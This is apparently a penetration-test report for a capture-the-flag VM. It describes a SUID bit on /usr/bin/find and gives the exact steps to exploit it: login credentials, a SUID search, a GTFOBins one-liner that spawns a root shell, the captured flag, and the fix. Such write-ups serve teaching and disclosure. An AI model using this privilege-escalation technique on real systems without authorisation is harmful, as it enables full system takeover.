## Report

```
To: security@escalatorlab.com
Subject: Security Vulnerability Report: Privilege Escalation in Escalator Challenge VM

Dear Security Team,

I am writing to report a privilege escalation vulnerability identified during an
authorized penetration testing exercise conducted on the Escalator Challenge VM.

---

Summary:

An authenticated low-privilege user is able to escalate their privileges to root
due to a misconfigured SUID bit on the /usr/bin/find binary. The SUID bit causes
the binary to execute with root-level effective permissions regardless of which
user invokes it. By leveraging this, an attacker with any valid user account can
spawn an interactive root shell and gain full control of the system.

---

Steps to Reproduce:

1. Connect to the target machine via SSH using low-privilege credentials:
   ssh guest@192.168.56.101
   Password: guest

2. Confirm current user privileges:
   id
   (Expected output: uid=1001(guest) gid=1001(guest))

3. Search for SUID binaries on the system:
   find / -perm -4000 -type f 2>/dev/null

4. Observe that /usr/bin/find has the SUID bit set:
   ls -la /usr/bin/find
   (Expected: -rwsr-xr-x 1 root root ...)

5. Exploit the SUID binary to spawn a root shell using GTFOBins technique:
   /usr/bin/find . -exec /bin/sh -p \; -quit

6. Confirm root access:
   id
   (Expected output: uid=1001(guest) euid=0(root))

7. Retrieve the flag:
   cat /root/root.txt

---

Impact:

If exploited, this vulnerability allows any authenticated user — including those
with minimal system access — to gain full root privileges. The potential impact
includes:

- Complete compromise of system integrity and confidentiality
- Unauthorized access to all files, credentials, and sensitive data on the system
- Ability to install backdoors, create persistent access, or pivot to other systems
- Ability to destroy or tamper with system logs, hiding evidence of the intrusion
- Full lateral movement capability within the network

This vulnerability has a HIGH severity rating and should be remediated immediately.

---

Proof of Root Access:

Root access was successfully obtained and the following flag was retrieved:

  FLAG{r00t_4cc3ss_gr4nt3d_v14_su1d_m1sc0nf1g}

Root shell confirmation:
  # id
  uid=1001(guest) gid=1001(guest) euid=0(root) egid=0(root)
  # cat /root/root.txt
  FLAG{r00t_4cc3ss_gr4nt3d_v14_su1d_m1sc0nf1g}

---

Recommended Fix:

Remove the SUID bit from /usr/bin/find:
  sudo chmod u-s /usr/bin/find



Conduct a full audit of all SUID binaries and apply the principle of least privilege
across all user accounts and system binaries.

Please feel free to reach out for further details or clarification.

Best regards,
Sheila Fana
```